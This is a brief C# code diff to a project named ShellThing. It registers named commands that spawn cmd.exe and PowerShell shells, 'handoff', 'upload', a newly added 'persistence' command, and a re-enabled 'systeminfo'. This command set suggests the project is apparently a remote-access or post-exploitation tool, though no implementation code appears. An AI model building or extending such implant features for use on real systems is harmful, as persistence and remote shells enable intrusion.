@@ -1,4 +1,5 @@
-﻿using System;
+﻿using ShellThing.Commands;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Text;
@@ -19,8 +20,9 @@ namespace ShellThing
             commands.Add("shell", new ShellSpawnCommand(@"cmd.exe"));
             commands.Add("powershell", new ShellSpawnCommand(@"powershell.exe"));
             commands.Add("handoff", new HandoffCommand());
-            //commands.Add("systeminfo", new SystemInfoCommand());
-            commands.Add("upload", new UploadCommand()); 
+            commands.Add("persistence", new PersistenceCommand());
+            commands.Add("systeminfo", new SystemInfoCommand());
+            commands.Add("upload", new UploadCommand());
             // Keep adding commands and their classes to the hashtable here
         }
 
